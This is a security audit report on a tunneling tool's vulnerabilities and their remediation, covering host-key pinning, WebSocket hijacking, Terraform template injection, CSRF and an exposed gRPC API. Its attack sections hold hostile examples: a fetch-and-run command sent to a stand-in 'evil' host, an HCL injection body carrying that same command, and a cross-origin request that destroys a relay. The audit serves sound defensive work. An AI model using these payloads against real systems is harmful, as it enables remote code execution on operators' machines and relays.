# Tunnel Whisperer — Security Audit (research/security-audit)

Multi-agent vulnerability hunt: 9 specialized auditors across all attack surfaces, each finding adversarially verified by an independent skeptic agent. 17 raw findings → 12 confirmed, 5 rejected as false positives.

_Date: 2026-08-26 · Branch: research/security-audit · Method: automated multi-agent review, top findings independently re-verified by hand._

## Remediation status

Fixed on `research/security-audit` (build, vet, unit tests, and the full `make e2e` suite green):

- **#1** — forward tunnel now pins the server SSH host key (fail-closed), delivered through enrollment.
- **#2** — WebSocket upgrade enforces a strict same-origin check.
- **#4 / #7** — the dashboard now requires a login token (Headlamp-style): a `SameSite=Strict` session cookie or `Authorization: Bearer <token>` on every route except `/login`/`/static`. `SameSite=Strict` closes the CSRF vector (#4); the token gate closes the unauthenticated-exposure vector (#7), including `/metrics`. Token via `tw dashboard token`; `--rotate` invalidates all live sessions.
- **#5** — the gRPC control API now binds loopback only (`127.0.0.1:api_port`) instead of all interfaces, removing the network exposure of its privileged, unauthenticated RPCs.
- **#3** — the relay `Name`, `Domain`, and relay SSH user are now validated against strict allowlists (`internal/ops/validate.go`) at every entry point (`ProvisionRelay`, `GenerateManualInstallScript`, `SetServerSettings`) before they reach the Terraform HCL / install-script templates, so a quote/`$()`/newline can no longer break out.
- **#6** — same validation closes the install-script shell injection (Domain as a hostname, SSH user as `^[a-z_][a-z0-9_-]{0,31}$`).
- **#10** — each relay route now pins the client cert's **issuer** CN (not just its subject CN), and enrollment enforces that a tenant's submitted CA subject equals its own server-id — so a tenant can no longer present a victim-CN cert off its own pool-trusted CA.

**Every finding from both passes is now resolved.** All CRITICAL/HIGH/MEDIUM are fixed (pass-1 #1–#7, #10; second-pass SP-1–SP-11, SP-17). Every LOW/INFO is either fixed or an explicitly-accepted deliberate tradeoff: **fixed** — #8 (single-session TOCTOU → atomic check-and-increment), #11/#12/SP-12 (credential-at-rest), SP-13 (overflow-safe direct-tcpip parse), SP-14 (0700/0600 provisioning artifacts), SP-15 (dashboard security headers), SP-16 (escaped username), SP-18 (zip-entry size cap), SP-19 (HTTP read timeouts), SP-20 (`permitopen` fail-closed); **accepted** — #9 (burn-first is deliberate PAKE brute-force protection; DoS mitigated by cheap re-issue + short expiry) and SP-21 (a recovery bundle deliberately persisted for the operator, already `0600`).

> **✅ Low-severity sweep.** #8 — single-session enforcement moved to an atomic check-and-increment under `connMu` (`internal/ssh/server.go`), closing the TOCTOU; the flag rides in the SSH permissions. SP-13 — `parseDirectTCPIP` does all length math in `uint64`/`int` against the real buffer, so a 2³² length can't wrap and slice past the end. SP-14 — the relay dir is `0700` and `cloud-init.yaml`/`main.tf` are `0600` (they carry the host key + VLESS UUID). SP-15 — every dashboard response carries CSP (`frame-ancestors 'none'`, no external origins), `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`. SP-16 — the username is HTML-escaped / URL-encoded before it reaches `innerHTML`. SP-18 — each config-bundle zip entry is capped at 1 MiB via `io.LimitReader`. SP-19 — the dashboard and enrollment HTTP servers set `ReadHeaderTimeout` (long-lived SSE/WS keep no write timeout). SP-20 — `isPortAllowed` fails closed when a key has no `permitopen`. Tests: `TestParseDirectTCPIPRejectsOverflow`, `TestIsPortAllowedFailsClosed`. `make e2e` 21/21.

> **✅ Remediated (#11, #12, SP-12) — credential-at-rest hardening.**
> - **#12** — `config.Save` writes `config.yaml` at `0600` (it can hold proxy creds + the VLESS UUID); the context-import unpack now also lands `config.yaml`/`*.token` at `0600` (`internal/config/config.go`, `internal/ops/profilebundle.go`). Test `TestSaveWritesConfig0600`.
> - **#11** — the proxy URL is redacted (`redactProxyURL`) before it reaches `slog` at both Xray start sites, so `user:pass` never lands in `tw.log` or the dashboard log console (`internal/xray/xray.go`). Test `TestRedactProxyURL`.
> - **SP-12** — passphrases are a deliberate, locked product decision (not reintroduced). Instead the misleading `cryptobox` package doc is corrected to state plainly that with the empty passphrase the layer provides integrity/framing but **not** confidentiality, and that identity bundles are protected only by `0600` perms + trusted-channel transfer (`internal/cryptobox/cryptobox.go`); the export path already writes `0600` and prints a "no passphrase, keep it secret" warning. This is the honest closure for the LOW — the residual is an accepted design tradeoff, now documented in code rather than obscured. `make e2e` 21/21.

## Summary

| # | Severity | Status | Finding | Location |
|---|----------|--------|---------|----------|
| 1 | 🔴 CRITICAL | ✅ Fixed | Forward tunnel disables SSH host-key verification, letting a malicious/compromis | `internal/ssh/forward.go:199` |
| 2 | 🔴 CRITICAL | ✅ Fixed | Cross-site WebSocket hijacking of the relay SSH terminal grants a shell on the c | `internal/dashboard/handlers_ws.go:15` |
| 3 | 🟠 HIGH | ✅ Fixed | HCL/Terraform template injection via unvalidated relay Name → local command exec | `internal/relay/terraform/hetzner.tf.tmpl:53` |
| 4 | 🟠 HIGH | ✅ Fixed | No CSRF protection on state-changing API endpoints (provision/destroy relay, mod | `internal/dashboard/handlers_api.go:320` |
| 5 | 🟠 HIGH | ✅ Fixed | gRPC control API listens on all interfaces (0.0.0.0) with no authentication, exp | `internal/api/server.go:31` |
| 6 | 🟡 MEDIUM | ✅ Fixed | Shell command injection via Domain/SSHUser in the generated relay install script | `internal/relay/terraform/install-script.sh.tmpl:39` |
| 7 | 🟡 MEDIUM | ✅ Fixed | Unauthenticated read endpoints expose full config and log stream; dangerous when | `internal/dashboard/handlers_api.go:75` |
| 8 | 🔵 LOW | ✅ Fixed | single-session enforcement is a TOCTOU race — the session count is checked at au | `internal/ssh/server.go:131` |
| 9 | 🔵 LOW | ⚠️ Accepted | Unauthenticated remote invite-burn DoS: single-use is enforced before password v | `internal/enroll/issuer.go:60` |
| 10 | 🔵 LOW | ✅ Fixed | Relay mTLS gate does not bind a tenant to its own CA — any tenant can impersonat | `internal/relay/caddy/Caddyfile.tmpl:9` |
| 11 | 🔵 LOW | ✅ Fixed | Proxy credentials logged at INFO to world-readable tw.log and the unauthenticate | `internal/xray/xray.go:242` |
| 12 | 🔵 LOW | ✅ Fixed | config.yaml written world-readable (0644) exposing proxy credentials and VLESS U | `internal/config/config.go:331` |

## Findings

### 1. 🔴 CRITICAL — Forward tunnel disables SSH host-key verification, letting a malicious/compromised relay MITM the end-to-end SSH and read all forwarded plaintext

> **✅ REMEDIATED** (`research/security-audit`). `ForwardTunnel` now pins the server's SSH host key via `gossh.FixedHostKey` and **fails closed** when no key is pinned (no silent `InsecureIgnoreHostKey` fallback). The server host public key is generated/exposed by `twssh.EnsureHostPublicKey` and delivered to clients through enrollment (`enroll.ClientGrant.ServerHostKey` → `config.ClientConfig.ServerHostKey`) and the downloadable-bundle path. Proven end-to-end by the enrollment + tunnel e2e scenarios. Migration: clients enrolled before this change must re-enroll to receive the pin.

**Location:** `internal/ssh/forward.go:199` · **Category:** crypto-weakness · **Confidence:** high

```go
sshConfig := &gossh.ClientConfig{
    User: ft.User,
    Auth: []gossh.AuthMethod{ gossh.PublicKeys(signer) },
    HostKeyCallback: gossh.InsecureIgnoreHostKey(),
    Timeout: 10 * time.Second,
}
```

**What it is.** The client's forward tunnel is the end-to-end SSH session that is supposed to make the relay unable to see plaintext (data path: client -> xray -> relay -> reverse-published port -> server embedded SSH :2222). It authenticates with InsecureIgnoreHostKey(), so the client never verifies it is actually talking to the server's ssh_host_ed25519_key. The server's host public key is not distributed in the user bundle, so no pinning is even possible today (only internal/config HostKeyDir exists; nothing ships the fingerprint to clients). This directly contradicts the stated trust model that the relay is semi-trusted and 'must never see plaintext' and that attackers may control or MITM the relay.

**Attack.** A relay operator/attacker who controls or has compromised the relay VM (explicitly in the threat model) runs their own SSH server on the reverse-published port instead of transparently piping bytes to the real server's :2222. When the client's ForwardTunnel dials through Xray to the relay, gossh.NewClientConn completes the handshake against the relay's host key because InsecureIgnoreHostKey() accepts it unconditionally. The client's per-mapping local listeners then forward every local_port -> remote_host:remote_port stream over this relay-terminated SSH channel in plaintext to the relay, and the relay can inject arbitrary responses back to the client's local applications. The relay cannot reuse the client's pubkey auth to reach the genuine server (SSH signatures are bound to the session id derived from the substituted handshake), and the client's SSH private key is not exposed, but neither is required to harvest and tamper with the forwarded data. Fix: distribute the server's ssh_host_ed25519_key.pub fingerprint in the user bundle and pin it via gossh.FixedHostKey in forward.go (and correspondingly for the reverse leg).

**Fix.** Pin the server's SSH host key. Distribute the server's ssh_host_ed25519_key public key (fingerprint) inside the enrollment/user bundle and use gossh.FixedHostKey (or a known_hosts callback) in ForwardTunnel.connect instead of InsecureIgnoreHostKey(). Fail the handshake on mismatch.

---

### 2. 🔴 CRITICAL — Cross-site WebSocket hijacking of the relay SSH terminal grants a shell on the cloud relay

> **✅ REMEDIATED** (`research/security-audit`). The `websocket.Upgrader` now uses `checkSameOrigin` instead of `CheckOrigin: return true`: the browser-supplied `Origin` must match the request `Host` (a missing `Origin` = non-browser client). A cross-site page can no longer open `/api/relay/ssh`. Defence-in-depth on top of the dashboard token gate (#4/#7), which independently now requires auth to reach the endpoint at all.

**Location:** `internal/dashboard/handlers_ws.go:15` · **Category:** auth-bypass · **Confidence:** high

```go
var wsUpgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool { return true },
}

func (s *Server) apiRelaySSH(w http.ResponseWriter, r *http.Request) {
	conn, err := wsUpgrader.Upgrade(w, r, nil)
	...
	sshFn := s.ops.RelaySSH        // admin/root relay SSH user
	err = sshFn(func(client *gossh.Client) error {
		session, _ := client.NewSession(); session.Shell() ... })
```

**What it is.** The /api/relay/ssh WebSocket endpoint upgrades with CheckOrigin unconditionally returning true, and the dashboard has no authentication of any kind (no cookie, token, or basic-auth check on any route in server.go:routes). WebSocket connections are not subject to the same-origin policy, so any web page loaded in the operator's browser can open ws://localhost:8080/api/relay/ssh. On connect, apiRelaySSH calls s.ops.RelaySSH -> withRelaySSH (internal/ops/user.go:689), which authenticates to the relay as cfg.Server.RelaySSHUser — the relay admin account provisioned with NOPASSWD:ALL — and runs session.Shell(), then bridges the browser's WebSocket binary frames straight to that shell's stdin. The attacker page reads stdout back over the same socket. The relay's mTLS gate is satisfied by the server's own client cert inside withRelaySSH, so no attacker credential is needed.

**Attack.** Accurate as reported. With tw serve running (dashboard default 127.0.0.1:8080) and a provisioned relay, the operator visits any attacker-controlled or ad-serving page. Its JS runs new WebSocket('ws://localhost:8080/api/relay/ssh'); the upgrade is accepted (CheckOrigin returns true, no auth), withRelaySSH authenticates to the relay as the NOPASSWD admin SSH user using the server's own key+client cert, and session.Shell() is bridged to the socket. The page sends binary frames (e.g. 'curl http://evil/x | sh\n') that execute on the relay VM as the admin user, and reads stdout back. Only correction to the write-up: it is textbook CSWSH made worse by the total absence of auth (the attacker needs no victim credentials at all), and the practical reliability is slightly reduced in browsers that enforce Private Network Access — an app-independent, inconsistent defense, not a mitigation in the code.

**Fix.** Require authentication before upgrading the WebSocket (a session token/CSRF-style token bound to the dashboard origin), and replace CheckOrigin: return true with a strict allowlist that verifies r.Header.Get("Origin") matches the dashboard's own host/port. Reject upgrades whose Origin is absent or mismatched. Do the same for every state-changing endpoint.

---

### 3. 🟠 HIGH — HCL/Terraform template injection via unvalidated relay Name → local command execution on the operator's machine

> **✅ REMEDIATED** (`research/security-audit`). `req.Name` is now validated against `^[a-z0-9]([a-z0-9-]{0,30}[a-z0-9])?$` in `ProvisionRelay` before it reaches any `.tf` template (`internal/ops/validate.go` `validateRelayName`), so it cannot contain the quote/newline needed to break out of the HCL string literal. The relay `Domain` is validated as a hostname on the same path. (The dashboard front door was also closed by the #4/#7 token gate + same-origin checks; this is the root-cause fix at the injection sink.) Unit tests in `validate_test.go`; `make e2e` 19/19 (RelayInstall).

**Location:** `internal/relay/terraform/hetzner.tf.tmpl:53` · **Category:** injection · **Confidence:** high

```go
resource "hcloud_server" "relay" {
  name        = "tw-{{.Name}}"
  ...
// also: hetzner.tf.tmpl:28  name = "tw-{{.Name}}"
//       aws.tf.tmpl:33      name_prefix = "tw-{{.Name}}-"
//       aws.tf.tmpl:75      tags = { Name = "tw-{{.Name}}" }
//       digitalocean.tf.tmpl:62  name = "tw-{{.Name}}"
// rendered by generate.go:97 render() using text/template (NO escaping)
// value set at relay.go:305  Name: req.Name  (RelayProvisionRequest, unvalidated)
```

**What it is.** req.Name from RelayProvisionRequest is substituted raw (text/template, no escaping) into the provider .tf files as an HCL string literal. There is no validation anywhere between the dashboard/CLI and the template (apiProvisionRelay at handlers_api.go:320 json-decodes and calls ProvisionRelay directly; the only default is a random suffix, applied only when Name==""). A Name containing a double-quote closes the HCL string and lets the attacker append arbitrary HCL — e.g. a null_resource with a provisioner "local-exec" block. terraform apply runs locally on the operator's host (terraform.go:20, relay.go:366) with cloud credentials in the environment, so the injected local-exec command runs as the operator.

**Attack.** Operator runs `tw serve` (server mode) which starts the unauthenticated dashboard on 127.0.0.1:8080. While it is up, the operator visits an attacker-controlled web page. That page issues a cross-origin `fetch('http://127.0.0.1:8080/api/relay/provision', {method:'POST', headers:{'Content-Type':'text/plain'}, body: JSON.stringify({name:'x"\n}\nresource "null_resource" "pwn" { provisioner "local-exec" { command = "curl https://evil/x|sh" } }\nresource "hcloud_server" "z" { name = "y', provider_name:'Hetzner', token:'...'})})`. The text/plain content type avoids a CORS preflight, so the browser sends it; json.Decode ignores Content-Type and populates req.Name unescaped. ProvisionRelay renders main.tf with the broken-out HCL, then runs `terraform init`/`apply` locally; the injected local-exec (or null_resource provisioner) executes on the operator's host as the operator, with cloud credentials in the process environment — full operator-host RCE and cloud-account takeover. DNS-rebinding is an equivalent delivery path since the endpoint validates neither Origin nor Host. The CLI path (operator typing their own --name) is self-injection and not a meaningful threat; the dashboard CSRF/rebind path is the exploitable one.

**Fix.** Validate Name (and every operator/attacker-supplied identifier) against a strict allowlist such as ^[a-z0-9-]{1,32}$ before it reaches the template, and reject otherwise. Do not build HCL by string substitution: pass user values as Terraform variables (-var / a machine-generated .tfvars written with a real HCL encoder) referenced as var.name inside the .tf, so the value can never be parsed as HCL. Add auth + origin checks to the dashboard.

---

### 4. 🟠 HIGH — No CSRF protection on state-changing API endpoints (provision/destroy relay, mode change, config upload)

> **✅ REMEDIATED** (`research/security-audit`). The dashboard now authenticates every non-exempt route via `authMiddleware`. Browser requests carry an httpOnly, **`SameSite=Strict`** session cookie, which the browser refuses to attach to cross-site requests — so a forged cross-origin POST cannot ride the operator's session. Non-browser callers use `Authorization: Bearer <token>`. Verified by the `Dashboard` e2e scenario (unauthenticated write → 401).

**Location:** `internal/dashboard/handlers_api.go:320` · **Category:** auth-bypass · **Confidence:** high

```go
func (s *Server) apiProvisionRelay(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost { ... }
	var req ops.RelayProvisionRequest
	json.NewDecoder(r.Body).Decode(&req)   // decoded regardless of Content-Type
	... go s.ops.ProvisionRelay(context.Background(), req, progress) }
```

**What it is.** Every mutating handler is a plain POST that decodes a JSON body with no CSRF token, no Origin/Referer check, and no Content-Type enforcement (json.NewDecoder parses the body even when the request is sent as text/plain). A cross-origin fetch with Content-Type: text/plain and a JSON string body is a CORS 'simple request' that browsers send without a preflight, so a malicious page can invoke these endpoints on the operator's loopback dashboard. Affected POST endpoints include /api/relay/provision, /api/relay/destroy, /api/relay/save-manual, /api/mode, /api/proxy, /api/settings/*, /api/server/{start,stop,restart}, /api/client/{start,stop,reconnect,upload}, /api/users/{apply,unregister}. /api/client/upload (apiClientUpload, line 261) accepts a multipart form — also a CSRF-simple content type — and overwrites the client's tunnel config via UploadClientConfig.

**Attack.** Operator runs `tw` with the dashboard active (default 127.0.0.1:8080, unauthenticated) and, in the same browser, visits an attacker page (or a page serving a malicious ad/XSS). The page issues fetch('http://127.0.0.1:8080/api/relay/destroy', {method:'POST', mode:'no-cors', headers:{'Content-Type':'text/plain'}, body:'{"creds":{}}'}) — a preflight-free simple request the handler decodes and executes, destroying the relay. The same technique hits /api/mode, /api/settings/*, /api/proxy, and — via a multipart/form-data body — /api/client/upload to overwrite the client's tunnel config and repoint it at an attacker relay/target. The response is opaque, but the writes are blind fire-and-forget so that is irrelevant. Accurate caveat: exploitation depends on the victim's browser not enforcing Private Network Access preflights for public→localhost requests; where a browser does enforce PNA the text/plain simple request may be blocked, but this varies by browser and version and is not a mitigation the code provides. The code itself has zero CSRF/origin defense.

**Fix.** Add a CSRF defense to all state-changing endpoints: require a same-origin custom header (e.g. an X-Requested-With / anti-CSRF token that the page sets and cross-origin callers cannot forge without a preflight), and validate the Origin header against the dashboard's own host. Reject requests whose Content-Type is not application/json for JSON handlers. Ideally gate the entire dashboard behind an authentication layer.

---

### 5. 🟠 HIGH — gRPC control API listens on all interfaces (0.0.0.0) with no authentication, exposing privileged RPCs and secrets

> **✅ REMEDIATED** (`research/security-audit`). Both bind sites (`tw serve`, `tw dashboard`) now build the API address via `apiListenAddr`, which is hard-wired to `127.0.0.1:api_port` — the API is an unauthenticated local control plane, and every CLI caller already dials `localhost:api_port`, so loopback is sufficient and removes all network exposure. No opt-in override is offered (exposing an unauthenticated control plane should not be a one-flag footgun); remote management, if ever needed, must come with authentication. Follow-up for untrusted multi-user hosts: add a gRPC auth interceptor (e.g. reusing the dashboard token) so local non-root users cannot call privileged RPCs.

**Location:** `internal/api/server.go:31` · **Category:** auth-bypass · **Confidence:** high

```go
// internal/cli/serve.go:60
apiAddr := fmt.Sprintf(":%d", cfg.Server.APIPort)   // ":50051" -> 0.0.0.0
apiSrv := api.NewServer(o, apiAddr)

// internal/api/server.go:19,31
gs := grpc.NewServer()                              // no creds, no interceptor
...
lis, err := net.Listen("tcp", s.addr)               // binds all interfaces
```

**What it is.** The daemon's gRPC control API is constructed with a bare `grpc.NewServer()` (server.go:19) — no `grpc.Creds` (plaintext, no TLS/mTLS) and no `UnaryInterceptor` — and its address is built as `fmt.Sprintf(":%d", cfg.Server.APIPort)` in both serve.go:60 and dashboard.go:87. `net.Listen("tcp", ":50051")` binds 0.0.0.0 / [::], i.e. every interface, not loopback. Every RPC handler (handlers.go) executes with full operator privilege and performs no caller-identity check: `GetConfig` returns the entire on-disk config including the Xray VLESS `UUID` (the relay-admission credential), relay host, and client cert paths (config.go:57-63); `DeleteUser` revokes access; `SetMode` flips server/client role; `StopServer`/`StartServer`/`StopClient` are a trivial DoS; `UploadClientConfig` overwrites the client config (redirecting tunnels); `ProvisionRelay`/`DestroyRelay` drive terraform. The stub `internal/auth` JWTProvider/OAuthProvider (jwt.go) is never wired into the server — there is no token validation path at all, so this is a total absence of authn, not a weak one. The contrast is deliberate elsewhere: the web dashboard on the adjacent port defaults to 127.0.0.1 via `resolveDashboardAddr` (dashboard.go:56, config.go:70-72 warns it is unauthenticated), while the API port has no listen-address setting and always binds broadly — an unintentional exposure.

**Attack.** An attacker with network reachability to the daemon host's port 50051 (same LAN/VLAN, a container that publishes 50051, or a cloud host whose non-loopback interface is exposed) points a gRPC client (using the package's registered JSON codec) at victim-ip:50051 and, with no credential, calls: DeleteUser to revoke legitimate SSH users; StopServer/StopClient to sever the tunnel (DoS); SetMode to break the role; UploadClientConfig (client mode) to re-point forwarded local ports at attacker-chosen hosts; and DestroyRelay to tear down the cloud relay. GetConfig also discloses the VLESS UUID and relay host — sensitive, but NOT sufficient alone to pass the relay's mTLS gate, since the per-server client certificate (only its path is returned, not its bytes) is still required. Correction to the reported attack: the UUID leak is not a complete relay-admission bypass; the mTLS client-cert requirement is an existing mitigation the report understates. The unauthenticated destructive/DoS RPCs are the real, unmitigated impact.

**Fix.** Bind the API listener to loopback by default (mirror resolveDashboardAddr — e.g. `127.0.0.1:%d`) and/or require an explicit opt-in listen address; and add real authentication before any privileged RPC — a local unix-socket with filesystem perms, or mTLS via `grpc.Creds`, or a per-daemon token checked in a UnaryServerInterceptor. At minimum stop constructing the address as `:%d`.

---

### 6. 🟡 MEDIUM — Shell command injection via Domain/SSHUser in the generated relay install script → root RCE on the relay

> **✅ REMEDIATED** (`research/security-audit`). `Domain` is validated as an RFC 1123 hostname and the relay SSH user against `^[a-z_][a-z0-9_-]{0,31}$` (`internal/ops/validate.go`) at every entry point that feeds the install script: `ProvisionRelay`, `GenerateManualInstallScript`, and `SetServerSettings` (which is where an attacker would persist a malicious `relay_ssh_user`). A value can no longer carry a quote, `$()`, `;`, or newline into the root-run bash or the `/etc/sudoers.d/99-<user>` filename. Unit tests in `validate_test.go`; `make e2e` 19/19.

**Location:** `internal/relay/terraform/install-script.sh.tmpl:39` · **Category:** injection · **Confidence:** high

```go
echo "Domain: {{.Domain}}"                                   # line 16
useradd -m -s /bin/bash {{.SSHUser}} 2>/dev/null || true      # line 38
echo "{{.SSHUser}} ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/99-{{.SSHUser}}  # line 39
mkdir -p /home/{{.SSHUser}}/.ssh                             # line 40
...
echo "  1. Set a DNS A record:  {{.Domain}}  ->  ${PUBLIC_IP}"  # line 136
```

**What it is.** GenerateManualInstallScript (relay.go:411) renders install-script.sh.tmpl with Domain (req.Domain) and SSHUser (cfg.Server.RelaySSHUser) substituted raw into a bash script that the operator runs as root on the relay VM. Neither value is shell-escaped or validated. Domain is fully attacker-controllable through the unauthenticated dashboard endpoint /api/relay/generate-script (handlers_api.go:412). SSHUser is settable via the unauthenticated /api/settings/server endpoint (handlers_api.go:680) and stored with no validation (SetServerSettings, ops.go:185). A double-quote or $()/; in Domain, or shell metacharacters / a crafted username in SSHUser, injects commands that run as root when the script executes — and SSHUser also lands unescaped in the sudoers filename `/etc/sudoers.d/99-{{.SSHUser}}` and in useradd.

**Attack.** text/template renders Domain/SSHUser unescaped into a root-run bash script with zero validation, so command injection is genuinely possible. Realistic chain: attacker reaches the unauthenticated localhost dashboard (DNS-rebinding, since there is no Host/Origin/auth check) and POSTs a malicious relay_ssh_user to /api/settings/server (persisted), or a malicious domain to /api/relay/generate-script. The payload only executes when the operator later downloads the generated install-relay.sh and runs it as root on the relay VM — giving root ON THE RELAY, which the design already treats as semi-trusted (no CA signing key, no plaintext, e2e SSH). Not operator-machine RCE and not a break of the secrecy boundary, and it requires the operator to run the script, so medium rather than high.

**Fix.** Validate Domain as a hostname (RFC 1123 label/FQDN regex) and SSHUser as ^[a-z_][a-z0-9_-]{0,31}$ before rendering. Emit shell values through single-quote-safe quoting (or pass them via a here-doc/argv that cannot be reinterpreted), never bare into double-quoted echo or command position. Add authentication and origin validation to the dashboard so these endpoints are not reachable cross-origin.

---

### 7. 🟡 MEDIUM — Unauthenticated read endpoints expose full config and log stream; dangerous when bound to 0.0.0.0

> **✅ REMEDIATED** (`research/security-audit`). All read endpoints (`/api/config`, `/api/logs`, SSE, and `/metrics`) are now behind the dashboard token gate; unauthenticated requests get `401` (browser navigations redirect to `/login`). The token lives in `config.Dir()/dashboard.token` at mode `0600` (kept out of the world-readable `config.yaml`). Prometheus scrapes `/metrics` with `authorization.credentials_file` pointed at that token file. This makes a `0.0.0.0` bind safe by default.

**Location:** `internal/dashboard/handlers_api.go:75` · **Category:** secret-exposure · **Confidence:** high

```go
func (s *Server) apiConfig(w http.ResponseWriter, r *http.Request) {
	cfg := s.ops.Config()
	jsonOK(w, cfg)
}
// ... and apiLogs streams the whole slog ring buffer with no auth
```

**What it is.** The dashboard has no authentication, and /api/config returns the entire loaded config object, while /api/logs (handlers_api.go:808) streams the full slog ring buffer and /api/stats + /metrics expose per-user traffic and topology. The dashboard command supports --listen 0.0.0.0 (internal/cli/dashboard.go:35) and server.dashboard_listen, which binds all of this — including the relay-shell WebSocket and every mutating endpoint from the two findings above — to every network interface with zero authentication. Even on the default loopback bind, /api/config and /api/logs disclose the relay host, SSH user, ports, proxy string, and any secrets that slog happens to record, to anything that can reach the port (co-located processes/containers, or the network once 0.0.0.0 is set).

**Attack.** On the default 127.0.0.1 bind, any co-located process, other local user, or container sharing the host's network namespace can GET /api/config to read the proxy credential string, VLESS UUID, relay host/port/path, and SSH user/ports, and open /api/logs to harvest any secrets slog records — no credential required. If the operator opts into --listen 0.0.0.0 or server.dashboard_listen: 0.0.0.0 (both accompanied by an in-product "unauthenticated, trusted network only" warning), that same disclosure is reachable by any host on the network. What this does NOT yield directly: the CA private key, SSH keys, or client.key (config stores only paths to them), and the leaked UUID does not by itself defeat relay mTLS admission, which still requires a CA-issued client certificate. Full compromise (relay root shell, destructive mutations) relies on the separately-reported unauthenticated WebSocket and mutating-endpoint issues, not on these read endpoints alone.

**Fix.** Introduce mandatory authentication for the dashboard (at minimum a locally-generated bearer token printed at startup and required on every request, including the WebSocket and SSE streams). Keep the default bind on loopback, and refuse to serve the relay-shell and mutating endpoints when bound to a non-loopback interface unless auth is configured. Scrub secrets from logs surfaced by /api/logs.

---

### 8. 🔵 LOW — single-session enforcement is a TOCTOU race — the session count is checked at auth but incremented only after the handshake completes

**Location:** `internal/ssh/server.go:131` · **Category:** race-condition · **Confidence:** high

```go
if singleSession && twUser != "" {
    s.connMu.Lock()
    count := s.connectedMap[twUser]
    s.connMu.Unlock()
    if count > 0 { return nil, fmt.Errorf("...already has an active session...") }
}
```

**What it is.** The single-session check in checkAuthorizedKey reads connectedMap[twUser] during public-key auth, but connectedMap[twUser]++ happens later in handleConnection (server.go:246), after gossh.NewServerConn returns. The check-and-increment are not atomic, so two connections that authenticate concurrently both observe count==0 and are both admitted before either increments. The 'single-session' restriction can thus be exceeded by racing connections.

**Attack.** A user (or attacker holding that user's stolen SSH key and client cert) whose authorized_keys entry carries the single-session option opens N SSH connections concurrently through the relay. All handshakes that reach the PublicKeyCallback before any earlier connection finishes its full handshake see connectedMap[twUser]==0 and are admitted, yielding multiple simultaneous sessions despite the single-session flag. The impact is limited to defeating the concurrency cap; permitopen port-forward restrictions still apply to every session, so no new destinations become reachable.

**Fix.** Make the check-and-reserve atomic: under a single connMu-held critical section, verify count==0 and increment a reservation for the twUser at auth time (rolling it back if the connection setup fails), rather than checking at auth and incrementing later in handleConnection.

---

### 9. 🔵 LOW — Unauthenticated remote invite-burn DoS: single-use is enforced before password verification

**Location:** `internal/enroll/issuer.go:60` · **Category:** dos · **Confidence:** high

```go
// handleStart, issuer.go
peer, err := base64.StdEncoding.DecodeString(req.Pake)
...
// Redeem FIRST: any start attempt — right or wrong code — burns the invite.
if err := h.invite.Redeem(); err != nil {
    http.Error(w, err.Error(), http.StatusGone)
    return
}
sess := NewSession(Issuer, h.invite.Code, h.invite.Tok)
msg := sess.Start()
if err := sess.Finish(peer); err != nil { ... }

// Caddyfile.tmpl: mode verify_if_given  (no client cert required on /enroll/<tok>/*)
```

**What it is.** handleStart() calls h.invite.Redeem() — which permanently sets redeemed=true — BEFORE any password/PAKE verification. A start attempt with any syntactically-valid SPAKE2 point (generatable with any password) therefore burns the live invite regardless of whether the caller knows the invite code. The /enroll/<tok>/* route is reverse-proxied by Caddy with client_auth mode verify_if_given (internal/relay/caddy/Caddyfile.tmpl:8), so it admits a bare TLS handshake with NO client certificate. There is no rate limiting or attempt cap on /start. The routing token tok = first8(cfg.Xray.UUID) (internal/ops/enroll.go:81, EnrollTok) is static per relay and is exposed in every invite URL that traverses the semi-trusted relay, so it is not a secret: any party that ever received an invite for this relay — or the relay operator itself — knows tok permanently. That party can POST junk to https://<relay>/enroll/<tok>/start to burn any invite the moment it is minted, indefinitely, denying enrollment of new servers/clients. Confidentiality/integrity are unaffected (no grant is issued without SAS confirmation and the correct PAKE key); this is availability only, and the operator recovers by re-minting — but the burn can simply be repeated on the next mint.

**Attack.** A party who previously received any invite for this issuer (the invite code's first field IS tok = first8(issuer UUID), static across all invites; enrollee.go:35 passes it explicitly), or the semi-trusted relay operator who sees the proxied /enroll/<tok>/ path, knows tok permanently. While the operator is running `tw relay invite`/`tw invite user` and waiting for the enrollee, the enroll HTTP listener is bound on the relay loopback (serveInvite, invite.go:33) and Caddy's verify_if_given route (Caddyfile.tmpl:8) admits a no-client-cert POST to /enroll/<tok>/start. handleStart (issuer.go:60) calls invite.Redeem() — a permanent one-shot burn — before sess.Finish(peer) PAKE verification, so any body with a base64-decodable `pake` field (not even a valid SPAKE2 point) burns the live invite. The legit enrollee's /start then returns 410 Gone. Requires the attacker to poll during the narrow, listener-live window (the route is dead otherwise). Availability-only, recoverable by re-minting, repeatable on each mint.

**Fix.** Do not consume the single-use token before the caller proves knowledge of the invite code. Complete the PAKE and require the enrollee's first authenticated message (a successful Open of the /offer box, i.e. proof of the shared key) before marking the invite redeemed; treat a failed-PAKE /start as a non-consuming attempt. If burn-on-first-contact must be kept for replay-hardening, add a short-window attempt cap / rate limit on /start per tok and/or bind the enroll route to a per-invite unguessable path segment (high-entropy nonce) rather than the static first8(UUID) token, so an off-path attacker cannot address a live invite.

---

### 10. 🔵 LOW — Relay mTLS gate does not bind a tenant to its own CA — any tenant can impersonate any other tenant at the client_auth layer (shared union trust_pool + CN-only route match)

> **✅ REMEDIATED** (`research/security-audit`). Two-part fix: (1) each Caddy route now requires the client cert's **issuer** CN to equal the tenant id in addition to the subject CN (`{...client.subject} == "CN=<id>" && {...client.issuer} == "CN=<id>"`) — since every per-server CA's subject is its own id (`pki.GenerateCA(id)`), a cert issued off a *different* pool-trusted CA no longer matches; (2) `DecodeJoinRequest` enforces that a joining tenant's submitted CA subject CN equals its server-id, so a tenant cannot register a CA whose subject impersonates another tenant's id. Together these close the union-trust-pool impersonation. Regression tests: `render_test.go` (issuer pin) and `join_test.go TestDecodeJoinRequestRejectsCAImpersonation`; `make e2e` 19/19 (MTLSGate, SecondTenant, ServerJoin, SelfEnroll).

**Location:** `internal/relay/caddy/Caddyfile.tmpl:9` · **Category:** auth-bypass · **Confidence:** high

```go
client_auth {
    mode verify_if_given
    trust_pool file{{range .Servers}} {{.CACertPath}}{{end}}
}
...
@{{.ID}} {
    path {{.Path}}*
    expression {http.request.tls.client.subject} == "CN={{.ID}}"
}
```

